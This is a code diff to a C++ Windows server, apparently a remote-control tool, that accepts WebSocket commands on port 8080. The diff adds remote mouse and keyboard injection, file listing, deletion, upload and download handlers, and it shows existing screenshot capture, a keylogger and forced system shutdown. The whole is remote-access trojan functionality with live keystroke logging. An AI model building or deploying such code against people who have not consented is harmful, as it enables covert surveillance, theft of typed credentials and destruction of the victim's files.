@@ -27,8 +27,24 @@
 #include "list_proc.h"
 #include "terminal.h"
 #include "announce.h"
+#include "control.h" 
 #include "systeminfo.h"
+#include "file_explorer.h"
 
+void DisableQuickEdit() {
+    HANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);
+    if (hInput == INVALID_HANDLE_VALUE) return;
+
+    DWORD prev_mode;
+    if (!GetConsoleMode(hInput, &prev_mode)) return;
+
+    // Tắt QuickEdit và Insert Mode, giữ lại các cờ khác
+    prev_mode &= ~ENABLE_QUICK_EDIT_MODE;
+    prev_mode &= ~ENABLE_INSERT_MODE;
+    prev_mode |= ENABLE_EXTENDED_FLAGS;
+
+    SetConsoleMode(hInput, prev_mode);
+}
 
 void session(tcp::socket socket) {
     auto sysMonitor = std::make_shared<SystemMonitor>();
@@ -70,7 +86,49 @@ void session(tcp::socket socket) {
                 executeCommand(command, path, *ws_ptr);
                 continue;
             }
-            if (data["command"] == "screenshot") {
+            if (data["command"] == "mouse_move") {
+                if (data.contains("x") && data.contains("y")) {
+                    double x = data["x"];
+                    double y = data["y"];
+                    MoveMouse(x, y);
+                }
+            }
+            else if (data["command"] == "mouse_click") {
+                if (data.contains("btn") && data.contains("action")) {
+                    ClickMouse(data["btn"], data["action"]);
+                }
+            }
+            else if (data["command"] == "key_event") {
+                if (data.contains("key") && data.contains("action")) {
+                    PressKey(data["key"], data["action"]);
+                }
+            }
+            else if (data["command"] == "list_directory") {
+                std::string path = data.contains("path") ? data["path"] : "C:\\";
+                std::cerr << "Listing directory: " << path << std::endl;
+                handle_list_directory(ws_ptr, path);
+            }
+            else if (data["command"] == "delete_file") {
+                if (data.contains("path")) {
+                    handle_delete_file(data["path"]);
+                    sendMsg(*ws_ptr, "text", "Info", "Deleted: " + std::string(data["path"]));
+                }
+            }
+            else if (data["command"] == "download_file") {
+                if (data.contains("path")) {
+                    sendMsg(*ws_ptr, "text", "Info", "Downloading file...");
+                    handle_download_file(ws_ptr, data["path"]);
+                }
+            }
+            else if (data["command"] == "upload_file") {
+                if (data.contains("path") && data.contains("filename") && data.contains("data")) {
+                    handle_upload_file(data["path"], data["filename"], data["data"]);
+                    sendMsg(*ws_ptr, "text", "Info", "File uploaded successfully.");
+                    // Refresh thư mục sau khi upload
+                    handle_list_directory(ws_ptr, data["path"]);
+                }
+            }
+            else if (data["command"] == "screenshot") {
                 sendMsg(*ws_ptr, "text", "Info", "Capturing screenshot...");
                 captureScreenshot(*ws_ptr);
                 std::cerr << "Capturing screenshot..." << std::endl;
@@ -85,12 +143,6 @@ void session(tcp::socket socket) {
                 list_applications(*ws_ptr);
                 std::cerr << "Listing running applications..." << std::endl;
             }
-            else if (data["command"] == "start_application") {
-                std::string appName = data["name"];
-                sendMsg(*ws_ptr, "text", "Info", "Starting application: " + appName);
-                start_application_exec(appName); 
-                std::cerr << "Starting application: " << appName << std::endl;
-            }
             else if (data["command"] == "start_keylogger") {
                 sendMsg(*ws_ptr, "text", "Info", "Keylogger started.");
                 key_log_start(ws_ptr);  
@@ -101,7 +153,7 @@ void session(tcp::socket socket) {
                 sendMsg(*ws_ptr, "text", "Info", "Keylogger stopped.");
                 std::cerr << "Keylogger stopped." << std::endl;
             }
-            else if (data["command"] == "shutdown") {
+            else if (data["command"] == "shutdown") {   
                 sendMsg(*ws_ptr, "text", "Info", "Shutting down the system...");
                 system("shutdown /s /t 0 /f");
                 std::cerr << "Shutting down the system..." << std::endl;
@@ -176,6 +228,10 @@ void session(tcp::socket socket) {
 }
 
 int main() {
+
+    DisableQuickEdit();
+     std::cout.setf(std::ios::unitbuf);
+
     try {
         net::io_context ioc;
         tcp::acceptor acceptor(ioc, {tcp::v4(), 8080});
